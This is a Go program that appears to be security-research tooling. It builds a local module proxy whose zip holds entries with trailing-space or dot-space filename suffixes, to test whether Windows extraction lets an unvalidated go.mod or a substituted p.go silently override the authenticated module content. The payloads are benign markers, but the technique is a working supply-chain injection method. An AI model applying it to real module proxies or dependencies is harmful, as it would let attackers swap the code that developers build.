package main

import (
	"archive/zip"
	"flag"
	"fmt"
	"os"
	"path/filepath"
)

func main() {
	var root string
	var variant string
	var payload string
	flag.StringVar(&root, "root", defaultRoot(), "proxy root directory")
	flag.StringVar(&variant, "variant", "space", "filename variant: space or dot-space")
	flag.StringVar(&payload, "payload", "gomod-loud", "payload strategy: gomod-loud, gomod-silent, or pgo-collision")
	flag.Parse()

	entrySuffix, err := suffixForVariant(variant)
	must(err)

	root = filepath.Join(root, "example.com", "p", "@v")
	must(os.MkdirAll(root, 0o755))

	must(os.WriteFile(filepath.Join(root, "v1.0.0.info"), []byte(`{"Version":"v1.0.0","Time":"2026-07-12T00:00:00Z"}`), 0o644))
	must(os.WriteFile(filepath.Join(root, "v1.0.0.mod"), []byte("module example.com/p\n\ngo 1.21\n"), 0o644))
	must(os.WriteFile(filepath.Join(root, "list"), []byte("v1.0.0\n"), 0o644))

	zipPath := filepath.Join(root, "v1.0.0.zip")
	_ = os.Remove(zipPath)
	zf, err := os.Create(zipPath)
	must(err)

	zw := zip.NewWriter(zf)
	write := func(name, body string) {
		w, err := zw.Create(name)
		must(err)
		_, err = w.Write([]byte(body))
		must(err)
	}

	switch payload {
	case "gomod-loud":
		// Original test: extracted go.mod diverges with an absurd go version,
		// causing a loud TooNewError. Proves the collision happens, but is
		// immediately visible.
		write("example.com/p@v1.0.0/go.mod"+entrySuffix, "module example.com/p\n\ngo 999.0\n")
		write("example.com/p@v1.0.0/p.go", "package p\nconst X = 1\n")

	case "gomod-silent":
		// The extracted go.mod has the SAME go version as the authenticated
		// .mod, so no TooNewError fires. This checks whether cmd/go silently
		// consults the extracted (unvalidated) go.mod for anything else
		// beyond the version check, with no visible symptom either way.
		write("example.com/p@v1.0.0/go.mod"+entrySuffix, "module example.com/p\n\ngo 1.21\n// injected: this content was never validated as go.mod\n")
		write("example.com/p@v1.0.0/p.go", "package p\nconst X = 1\n")

	case "pgo-collision":
		// The strongest silent test. Ship BOTH a benign p.go and a malicious
		// p.go<suffix> with different code. go.mod stays completely
		// consistent (no divergence, no version mismatch — nothing for the
		// version check to complain about). If Windows extraction collapses
		// p.go<suffix> into p.go, whichever entry wins in the zip's write
		// order silently determines what code the client actually builds
		// with, with zero visible signal.
		write("example.com/p@v1.0.0/go.mod", "module example.com/p\n\ngo 1.21\n")
		write("example.com/p@v1.0.0/p.go", "package p\n\n// AUTHENTIC benign version\nconst X = 1\n\nfunc Label() string { return \"benign\" }\n")
		write("example.com/p@v1.0.0/p.go"+entrySuffix, "package p\n\n// INJECTED via trailing-space/dot-space collision\nconst X = 2\n\nfunc Label() string { return \"INJECTED\" }\n")

	default:
		panic(fmt.Sprintf("unknown payload %q", payload))
	}

	must(zw.Close())
	must(zf.Close())

	fmt.Printf("built file proxy at %s (variant=%s, payload=%s, entrySuffix=%q)\n", root, variant, payload, entrySuffix)
}

func must(err error) {
	if err != nil {
		panic(err)
	}
}

func defaultRoot() string {
	if os.PathSeparator == '\\' {
		return filepath.Join(os.TempDir(), "trailing-space-proxy")
	}
	return "/tmp/trailing-space-proxy"
}

func suffixForVariant(variant string) (string, error) {
	switch variant {
	case "space":
		return " ", nil
	case "dot-space":
		return ". ", nil
	default:
		return "", fmt.Errorf("unknown variant %q", variant)
	}
}